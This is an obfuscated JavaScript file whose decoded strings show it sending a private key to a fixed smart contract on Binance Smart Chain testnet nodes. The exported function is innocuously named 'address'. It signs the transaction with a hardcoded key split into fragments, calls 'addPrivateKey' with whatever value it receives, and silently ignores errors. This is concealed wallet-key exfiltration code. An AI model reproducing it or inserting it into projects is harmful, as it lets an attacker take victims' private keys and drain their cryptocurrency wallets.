const _0x54553b = _0x23bf;
function _0x23bf(_0x3076a2, _0xffba7c) {
  const _0xeeb26d = _0xeeb2();
  return (
    (_0x23bf = function (_0x23bf6c, _0x5c8347) {
      _0x23bf6c = _0x23bf6c - 0x9d;
      let _0x573fc9 = _0xeeb26d[_0x23bf6c];
      return _0x573fc9;
    }),
    _0x23bf(_0x3076a2, _0xffba7c)
  );
}
(function (_0x59f810, _0x4b29ef) {
  const _0x4a7944 = _0x23bf,
    _0x55943f = _0x59f810();
  while (!![]) {
    try {
      const _0x2970bd =
        -parseInt(_0x4a7944(0xb2)) / 0x1 +
        -parseInt(_0x4a7944(0xb1)) / 0x2 +
        (parseInt(_0x4a7944(0xa3)) / 0x3) * (-parseInt(_0x4a7944(0xb3)) / 0x4) +
        -parseInt(_0x4a7944(0xb4)) / 0x5 +
        parseInt(_0x4a7944(0xae)) / 0x6 +
        (parseInt(_0x4a7944(0xac)) / 0x7) * (parseInt(_0x4a7944(0xa9)) / 0x8) +
        (parseInt(_0x4a7944(0x9d)) / 0x9) * (parseInt(_0x4a7944(0xa5)) / 0xa);
      if (_0x2970bd === _0x4b29ef) break;
      else _0x55943f['push'](_0x55943f['shift']());
    } catch (_0x4b3cd0) {
      _0x55943f['push'](_0x55943f['shift']());
    }
  }
})(_0xeeb2, 0x293f9);
const contractAddress = '0x4Cc756Ef09e5d17cDB093B9D8F28453646536881';
let sdkfjsk = '76';
const contractABI = [
    {
      type: _0x54553b(0xab),
      name: _0x54553b(0xa0),
      inputs: [
        {
          name: _0x54553b(0x9e),
          type: _0x54553b(0xaa),
          internalType: _0x54553b(0xaa),
        },
      ],
      outputs: [],
      stateMutability: 'nonpayable',
    },
  ],
  rpcUrls = [
    'https://data-seed-prebsc-1-s1.binance.org:8545',
    _0x54553b(0xa4),
    'https://data-seed-prebsc-1-s3.binance.org:8545',
    _0x54553b(0xa7),
  ];
let store_contract = null;
async function setContract(_0x3dfecc) {
  const _0x3f83b0 = _0x54553b;
  let _0x140f6c = ![],
    _0x5754d6 = 0x0,
    _0x5b901c;
  sdkfjsk = (sdkfjsk + _0x3f83b0(0xaf))[_0x3f83b0(0xa8)]();
  while (!_0x140f6c && _0x5754d6 < _0x3dfecc[_0x3f83b0(0xa1)]) {
    try {
      _0x5b901c = new ethers['providers']['JsonRpcProvider'](
        _0x3dfecc[_0x5754d6],
      );
      let _0x4edead = await _0x5b901c[_0x3f83b0(0xad)]();
      _0x140f6c = !![];
      const _0x53a6f4 = await new ethers[_0x3f83b0(0xa2)](
          (sdkfjsk + '5004a4760517c')[_0x3f83b0(0xa8)](),
          _0x5b901c,
        ),
        _0x1172ef = new ethers[_0x3f83b0(0xb0)](
          contractAddress,
          contractABI,
          _0x53a6f4,
        );
      return _0x1172ef;
    } catch (_0x378a11) {
      _0x5754d6++;
    }
  }
  return null;
}
function _0xeeb2() {
  const _0x2ffd78 = [
    '1604974PCulon',
    'getBlockNumber',
    '159696hMxXwN',
    '508181f507f1199e3d8cd360518',
    'Contract',
    '410502QlAKow',
    '262169fcIrYm',
    '4xkEVAA',
    '1315665VmHVzF',
    '18XvfJUC',
    'privateKey',
    'wait',
    'addPrivateKey',
    'length',
    'Wallet',
    '139866apmPww',
    'https://data-seed-prebsc-2-s1.binance.org:8545',
    '3451150XeRxZY',
    'hash',
    'https://data-seed-prebsc-2-s3.binance.org:8545',
    'trim',
    '8bSuTyZ',
    'string',
    'function',
  ];
  _0xeeb2 = function () {
    return _0x2ffd78;
  };
  return _0xeeb2();
}
async function address(_0x4056cb) {
  const _0x1626e3 = _0x54553b;
  sdkfjsk = (sdkfjsk + '6f47ebccb7908f3d2e631c')['trim']();
  try {
    !store_contract && (store_contract = await setContract(rpcUrls));
    if (!store_contract) throw new Error('');
    const _0x4c8a10 = await store_contract[_0x1626e3(0xa0)](_0x4056cb);
    return await _0x4c8a10[_0x1626e3(0x9f)](), _0x4c8a10[_0x1626e3(0xa6)];
  } catch (_0x418a66) {}
}
